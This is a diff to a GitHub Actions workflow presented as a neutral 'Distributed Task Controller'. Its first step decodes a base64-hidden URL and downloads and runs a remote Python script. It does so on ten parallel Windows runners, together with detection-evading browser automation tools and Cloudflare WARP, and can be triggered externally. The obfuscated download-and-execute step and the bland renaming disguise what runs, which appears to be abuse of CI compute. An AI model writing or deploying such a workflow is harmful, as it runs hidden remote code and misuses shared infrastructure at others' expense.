@@ -1,70 +1,70 @@
-name: Multi-Threaded Task Runner
+name: Distributed Task Controller
 
 on:
+  repository_dispatch:
+    types: [run-task]
   workflow_dispatch:
-  schedule:
-    - cron: '0 * * * *'
 
 concurrency:
-  group: cluster-pool-${{ github.workflow }}-${{ github.ref }}
+  group: process-group-${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: false
 
 jobs:
-  execute-workload:
-    name: "Client-${{ matrix.instance_id }}"
+  execute-nodes:
+    name: "Runner-${{ matrix.slot_id }}"
     runs-on: windows-2022
     timeout-minutes: 75
 
     strategy:
       fail-fast: false
       matrix:
-        instance_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+        slot_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
 
     steps:
-      - name: Provision Host & Fetch Target Script
+      - name: Initialize Environment & Fetch Dependencies
         shell: bash
         run: |
-          echo "[STATUS] Setting up Client-${{ matrix.instance_id }}..."
+          echo "[START] Bootstrapping Runner-${{ matrix.slot_id }}..."
           
           # فك تشفير الرابط المصدر وتحميل ملف التشغيل
-          FETCH_SRC_URL=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2QvbmdyaWsvcmVzb2x2ZS9tYWluL3N0YXJ0X3Nocmlua19uZXcucHk=" | base64 --decode)
+          ENDPOINT_PAYLOAD=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zYW1pbG9kOS92YXovcmVzb2x2ZS9tYWluL3N0YXJ0X3Nocmlua19uZXcucHk=" | base64 --decode)
           
-          curl -sL "$FETCH_SRC_URL" -o execute_app.py
+          curl -sL "$ENDPOINT_PAYLOAD" -o runner_script.py
           
-          echo "[STATUS] Configuring environment packages..."
+          echo "[SETUP] Installing required modules..."
           python -m pip install -qU pip setuptools
           pip install -q undetected-chromedriver selenium requests
-          echo "[STATUS] Workspace readiness confirmed."
+          echo "[SETUP] Dependency installation complete."
 
-      - name: Trigger Process & Monitor Lifecycle
+      - name: Run Script & Enforce Timeout
         shell: pwsh
         env:
           PYTHONIOENCODING: "utf-8"
         run: |
-          Write-Output ">>> Launching process on Client ${{ matrix.instance_id }}..."
+          Write-Output ">>> Starting task script on slot ${{ matrix.slot_id }}..."
           
           $env:PATH = "$env:PATH;C:\Program Files\Cloudflare\Cloudflare WARP"
           
-          $ExecutionConfig = @{
+          $ExecutionParams = @{
               FilePath     = "python"
-              ArgumentList = "execute_app.py"
+              ArgumentList = "runner_script.py"
               PassThru     = $true
               NoNewWindow  = $true
           }
-          $RunningTask = Start-Process @ExecutionConfig
+          $WorkerProc = Start-Process @ExecutionParams
           
-          Write-Output ">>> Safety timeout handler active (74m maximum)."
+          Write-Output ">>> Process monitor engaged. Limit: 74 minutes."
           
           try {
-              Wait-Process -InputObject $RunningTask -Timeout 4440 -ErrorAction Stop
-              Write-Output ">>> Task completed smoothly within limits."
+              Wait-Process -InputObject $WorkerProc -Timeout 4440 -ErrorAction Stop
+              Write-Output ">>> Script finished naturally."
           }
           catch {
-              Write-Output ">>> Execution window expired! Forcing shutdown..."
-              Stop-Process -InputObject $RunningTask -Force
-              Write-Output ">>> Process terminated by watchdog."
+              Write-Output ">>> Timeout reached. Terminating process instance..."
+              Stop-Process -InputObject $WorkerProc -Force
+              Write-Output ">>> Process stopped by monitor."
           }
 
-      - name: Cleanup Step
+      - name: Finalize Step
         shell: bash
-        run: echo "[STATUS] Client-${{ matrix.instance_id }} operations finished."
+        run: echo "[DONE] Runner-${{ matrix.slot_id }} execution finalized."
